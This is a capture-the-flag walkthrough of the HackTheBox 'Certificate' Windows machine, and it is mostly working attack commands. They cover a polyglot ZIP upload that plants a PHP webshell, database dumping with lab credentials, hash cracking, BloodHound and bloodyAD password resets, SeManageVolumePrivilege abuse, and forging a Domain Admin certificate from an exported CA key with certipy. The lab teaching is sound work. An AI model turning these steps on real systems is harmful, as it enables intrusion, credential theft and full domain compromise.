---
title: "Certificate"
date: 2025-05-31
retire_date: 9999-09-09
tags: ["htb", "Windows", "Hard"]
difficulty: "Medium"
base_points: 40
event: "HackTheBox"
Author: "Spectra199"
cover:
  image: "/images/ctf/htb/Certificate.png"
  alt: "Certificate Machine"
  relative: true
---

{{< machine-info-shortcode >}}

## Walkthrough

Hard - Windows

A web-app foothold via a polyglot ZIP upload, then a slow climb through AD until we abuse AD CS to forge a Domain Admin certificate.

## Enum

After registering an account and brute-forcing directories, an `upload.php` surfaces — uploads are always worth a closer look.

```
gobuster dir -u http://certificate.htb/ -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -x php,php3,html,txt -t 75
```

{{< figure src="/images/ctf/htb/Pasted image 20250607111256.png" alt="gobuster results" caption=" " align="center" >}}

The upload endpoint complains it needs a `sid` parameter:

{{< figure src="/images/ctf/htb/Pasted image 20250607111350.png" alt="sid parameter required" caption=" " align="center" >}}

Fuzzing the parameter, `s_id=36` is accepted and lets us upload ZIP files:

{{< figure src="/images/ctf/htb/Pasted image 20250607111610.png" alt="zip upload allowed" caption=" " align="center" >}}

### Polyglot ZIP

The validator only inspects the first archive, so we concatenate a "clean" ZIP with a malicious one — the server validates the legit half but extracts our webshell from the second.

```
echo "test file" > legit.pdf

file legit.pdf
legit.pdf: ASCII text

zip normal.zip legit.pdf
  adding: legit.pdf (stored 0%)

mkdir payload_files
cd payload_files
cp /opt/best_shell.php .
nano best_shell.php
cd ..

zip -r payload.zip payload_files
  adding: payload_files/ (stored 0%)
  adding: payload_files/best_shell.php (deflated 72%)

cat normal.zip payload.zip > combined.zip
```

{{< figure src="/images/ctf/htb/Pasted image 20250607112535.png" alt="crafting combined zip" caption=" " align="center" >}}

{{< figure src="/images/ctf/htb/Pasted image 20250607112550.png" alt="combined zip" caption=" " align="center" >}}

Upload the combined ZIP and browse to the extracted shell:

```
http://certificate.htb/static/uploads/530bcdb078c2d83e3d96a0788d19bbc3/payload_files/best_shell.php
```

{{< figure src="/images/ctf/htb/Pasted image 20250607112645.png" alt="webshell" caption=" " align="center" >}}

### MySQL

A `run.php` holds the database password, so we dump the app DB to harvest user hashes.

{{< figure src="/images/ctf/htb/Pasted image 20250607113315.png" alt="run.php db creds" caption=" " align="center" >}}

```
"C:\\xampp\\mysql\\bin\\mysqldump.exe" -u certificate_webapp_user -p"cert!f!c@teDBPWD" Certificate_WEBAPP_DB
```

{{< figure src="/images/ctf/htb/Pasted image 20250607113407.png" alt="mysqldump output" caption=" " align="center" >}}

Querying the `USERS` table directly is cleaner than reading the dump:

```
"C:\\xampp\\mysql\\bin\\mysql.exe" -u certificate_webapp_user -p"cert!f!c@teDBPWD" -D Certificate_WEBAPP_DB -e "SELECT * from USERS;"
```

### Cracking

Ignoring the obvious 2025 decoy account, we crack the remaining hashes:

{{< figure src="/images/ctf/htb/Pasted image 20250607114247.png" alt="cracked hash" caption=" " align="center" >}}

…and confirm which domain user the cracked password belongs to:

{{< figure src="/images/ctf/htb/Pasted image 20250607114328.png" alt="user match" caption=" " align="center" >}}

### BloodHound

With valid domain creds (`sara.b:Blink182`), we collect the graph to plan the AD path:

```
ntpdate -u 10.10.11.71 | bloodhound-python -u 'sara.b' -p 'Blink182' -ns 10.10.11.71 -dc DC01.certificate.htb -d certificate.htb -c all
```

## user.txt

`sara.b` can reset `lion.sk`'s password, so we take that account over:

```
bloodyAD -u sara.b -p 'Blink182' -d certificate.htb --dc-ip 10.10.11.71 set password lion.sk 'password@123'
```

{{< figure src="/images/ctf/htb/Pasted image 20250607121155.png" alt="lion.sk password reset" caption=" " align="center" >}}

## root.txt

Enumerating the box, four users exist and a `SeManageVolumeExploit.exe` is sitting on disk — a strong hint that one of these accounts holds `SeManageVolumePrivilege`.

{{< figure src="/images/ctf/htb/Pasted image 20250607121406.png" alt="users and exploit binary" caption=" " align="center" >}}

### Pivot to ryan.k

We reset `ryan.k`'s password and check — that's the account with the privilege:

{{< figure src="/images/ctf/htb/Pasted image 20250607121535.png" alt="ryan.k privilege" caption=" " align="center" >}}

[SeManageVolumeExploit](https://github.com/CsEnox/SeManageVolumeExploit/releases/tag/public) abuses `SeManageVolumePrivilege` to grant `ryan.k` full control over `C:\` — the binary and `ca.pfx` were already staged on the box.

{{< figure src="/images/ctf/htb/Pasted image 20250607123243.png" alt="full control over C" caption=" " align="center" >}}

With write access to the CA store, we export the CA's private key:

```
certutil -exportPFX my "Certificate-LTD-CA" C:\Users\Public\ca.pfx
```

{{< figure src="/images/ctf/htb/Pasted image 20250607123302.png" alt="exported ca.pfx" caption=" " align="center" >}}

### Forging the admin certificate

Owning the CA key means we can forge a certificate for *any* user — so we mint one for Administrator (a Golden Certificate / ESC-style abuse):

```
certipy forge -ca-pfx ca.pfx -upn 'administrator@certificate.htb' -subject 'CN=Administrator,CN=Users,DC=certificate,DC=htb' -out forged_admin.pfx
```

{{< figure src="/images/ctf/htb/Pasted image 20250607123425.png" alt="forged admin pfx" caption=" " align="center" >}}

Authenticate with the forged certificate to pull the Administrator hash (syncing time first):

```
sudo ntpdate -u 10.10.11.71
```

```
certipy auth -pfx forged_admin.pfx -username 'administrator' -domain 'certificate.htb' -dc-ip 10.10.11.71
```

{{< figure src="/images/ctf/htb/Pasted image 20250607123633.png" alt="administrator hash" caption=" " align="center" >}}

With the hash we log in as Administrator and own the box.

{{<seperator>}}
